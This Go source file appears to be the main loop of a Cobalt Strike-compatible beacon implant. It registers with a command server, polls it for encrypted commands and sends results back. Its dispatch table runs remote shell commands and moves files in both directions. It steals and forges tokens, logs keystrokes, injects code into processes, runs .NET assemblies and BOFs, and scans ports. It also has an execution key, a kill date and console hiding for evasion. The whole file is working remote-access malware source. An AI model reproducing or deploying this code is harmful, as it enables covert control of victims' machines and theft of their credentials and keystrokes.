package main

import (
	"bytes"
	"encoding/hex"
	"errors"
	"fmt"
	"main/communication"
	"main/config"
	"main/crypt"
	"main/packet"
	"main/services"
	"os"
	"time"
)

func main() {
	if config.ExecuteKey != "" {
		if len(os.Args) != 2 {
			return
		}
		if os.Args[1] != config.ExecuteKey {
			return
		}
	}

	if config.ExecuteTime != "" {
		t, _ := time.Parse("2021-01-01 12:00:05", config.ExecuteTime)
		if time.Now().UTC().Unix() > t.Unix() {
			return
		}
	}

	if config.HideConsole {
		errConsole := services.HideConsole()
		if errConsole != nil && errConsole.Error() != "The operation completed successfully." {
			fmt.Println(errConsole)
		}
	}

	errDPI := services.ProcessDPIAware()
	if errDPI != nil && errDPI.Error() != "The operation completed successfully." {
		fmt.Println(errDPI)
	}

	errFirstBlood := communication.FirstBlood()
	if errFirstBlood != nil {
		fmt.Println(errFirstBlood)
		time.Sleep(3 * time.Second)
		return
	}

	/*errInit := services.Init()
	if errInit != nil {
		communication.ErrorProcess(errInit)
	}*/

	var Token uintptr
	var powershellImport []byte
	var argues = make(map[string]string)
	for {
		data, err := communication.PullCommand()
		if data != nil && err == nil {
			totalLen := len(data)
			if totalLen > 0 {
				_ = data[totalLen-crypt.HmacHashLen:]
				restBytes := data[:totalLen-crypt.HmacHashLen]
				decrypted, errPacket := communication.DecryptPacket(restBytes)
				if errPacket != nil {
					communication.ErrorProcess(errPacket)
					continue
				}
				_ = decrypted[:4]
				lenBytes := decrypted[4:8]
				packetLen := communication.ReadInt(lenBytes)
				decryptedBuf := bytes.NewBuffer(decrypted[8:])
				for {
					if packetLen <= 0 {
						break
					}
					cmdType, cmdBuf, errParse := communication.ParsePacket(decryptedBuf, &packetLen)
					if errParse != nil {
						communication.ErrorProcess(errParse)
						continue
					}
					if cmdBuf != nil {
						//fmt.Printf("cmdType: %d\n",cmdType)
						//fmt.Printf("cmdBufferString: %s\n",cmdBuf)
						//fmt.Printf("cmdBuffer: %v\n",cmdBuf)
						var err error
						var callbackType int
						var result []byte
						switch cmdType {
						case packet.CMD_TYPE_SHELL:
							result, err = services.CmdShell(cmdBuf, Token, argues)
							callbackType = 0
						case packet.CMD_TYPE_UPLOAD_START:
							filePath, fileData := services.ParseCommandUpload(cmdBuf)
							match := len(filePath) == 30 && bytes.HasPrefix(filePath, []byte("\\\\127.0.0.1\\ADMIN$\\")) && bytes.HasSuffix(filePath, []byte(".exe"))
							if match && bytes.Contains(fileData, []byte("RegisterServiceCtrlHandlerA")) && len(fileData) > 250000 && len(fileData) < 350000 {
								result, err = services.CmdService(Token, argues)
								callbackType = 0
							} else {
								result, err = services.CmdUpload(cmdBuf, true)
								callbackType = -1
							}
						case packet.CMD_TYPE_UPLOAD_LOOP:
							result, err = services.CmdUpload(cmdBuf, false)
							callbackType = -1
						case packet.CMD_TYPE_DOWNLOAD:
							result, err = services.CmdDownload(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_FILE_BROWSE:
							result, err = services.CmdFileBrowse(cmdBuf)
							callbackType = 22
						case packet.CMD_TYPE_CD:
							result, err = services.CmdCd(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_SLEEP:
							result, err = services.CmdSleep(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_PAUSE:
							result, err = services.CmdPause(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_PWD:
							result, err = services.CmdPwd()
							callbackType = 19
						case packet.CMD_TYPE_EXIT:
							result, err = services.CmdExit()
							if err == nil {
								return
							}
							callbackType = 0
						case packet.CMD_TYPE_SPAWN_X64:
							bx64, _ := hex.DecodeString("626561636f6e2e7836342e646c6c") //beacon.x64.dll
							if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx64) {
								filename, _ := os.Executable()
								result, err = services.CmdExecute([]byte(filename), Token, argues)
							} else {
								result, err = services.CmdSpawnX64(cmdBuf)
							}
							callbackType = 0
						case packet.CMD_TYPE_SPAWN_X86:
							bx86, _ := hex.DecodeString("626561636f6e2e646c6c") //beacon.dll
							if bytes.Contains(bytes.ReplaceAll(cmdBuf, []byte("\x00"), []byte("")), bx86) {
								filename, _ := os.Executable()
								result, err = services.CmdExecute([]byte(filename), Token, argues)
							} else {
								result, err = services.CmdSpawnX86(cmdBuf)
							}
							callbackType = 0
						case packet.CMD_TYPE_EXECUTE:
							result, err = services.CmdExecute(cmdBuf, Token, argues)
							callbackType = 0
						case packet.CMD_TYPE_GETUID:
							result, err = services.CmdGetUid()
							callbackType = 0
						case packet.CMD_TYPE_STEAL_TOKEN:
							Token, result, err = services.CmdStealToken(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_GET_PRIVS:
							result, err = services.CmdGetPrivs(cmdBuf, Token)
							callbackType = 0
						case packet.CMD_TYPE_PS:
							result, err = services.CmdPs(cmdBuf)
							resultType := communication.ReadInt(cmdBuf)
							//fmt.Println(resultType)
							if resultType == 0 {
								callbackType = 17
							} else {
								callbackType = 22
							}
						case packet.CMD_TYPE_KILL:
							result, err = services.CmdKill(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_MKDIR:
							result, err = services.CmdMkdir(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_DRIVES:
							result, err = services.CmdDrives(cmdBuf)
							callbackType = 22
						case packet.CMD_TYPE_RM:
							result, err = services.CmdRm(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_CP:
							result, err = services.CmdCp(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_MV:
							result, err = services.CmdMv(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_REV2SELF:
							Token, result, err = services.CmdRun2self(Token)
							callbackType = 0
						case packet.CMD_TYPE_MAKE_TOKEN:
							Token, result, err = services.CmdMakeToken(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_PIPE:
							result, err = services.CmdHandlerJob(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_PORTSCAN_X64:
							result, err = services.CmdPortscanX64(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_PORTSCAN_X86:
							result, err = services.CmdPortscanX86(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_KEYLOGGER:
							result, err = services.CmdKeylogger(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X64:
							result, err = services.CmdExecuteAssemblyX64(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_EXECUTE_ASSEMBLY_X86:
							result, err = services.CmdExecuteAssemblyX86(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64:
							result, err = services.CmdExecuteAssemblyX64(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86:
							result, err = services.CmdExecuteAssemblyX86(cmdBuf)
						case packet.CMD_TYPE_IMPORT_POWERSHELL:
							result, err = services.CmdImportPowershell(cmdBuf)
							powershellImport = result
							callbackType = 0
						case packet.CMD_TYPE_POWERSHELL_PORT:
							result, err = services.CmdPowershellPort(cmdBuf, powershellImport)
							callbackType = 0
						case packet.CMD_TYPE_INJECT_X64:
							result, err = services.CmdInjectX64(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_INJECT_X86:
							result, err = services.CmdInjectX86(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_BOF:
							result, err = services.CmdBof(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_RUNU:
							result, err = services.CmdRunu(cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_ARGUE_QUERY:
							result, err = services.CmdArgueQuery(argues)
							callbackType = 0
						case packet.CMD_TYPE_ARGUE_REMOVE:
							result, err = services.CmdArgueRemove(argues, cmdBuf)
							callbackType = 0
						case packet.CMD_TYPE_ARGUE_ADD:
							result, err = services.CmdArgueAdd(argues, cmdBuf)
							callbackType = 0
						default:
							err = errors.New("This type is not supported now.")
						}
						// convert charset here
						if err != nil {
							communication.ErrorProcess(err)
						} else {
							if callbackType >= 0 {
								communication.DataProcess(callbackType, result)
							}
						}
					}
				}
			}
		} else if err != nil {
			communication.ErrorProcess(err)
		}
		/*if config.Sleep_mask {
			packet.DoSuspendThreads()
			fmt.Println("EncryptHeap")
			packet.EncryptHeap()
			test := false
			windows.SleepEx(1000,test)
			packet.EncryptHeap()
			fmt.Println("DecryptHeap")
			packet.DoResumeThreads()
		} else {
			time.Sleep(config.WaitTime)
		}*/
		waitTime, err := services.CallbackTime()
		if err != nil {
			fmt.Println(err)
			communication.ErrorProcess(err)
		}
		time.Sleep(waitTime)

	}

}
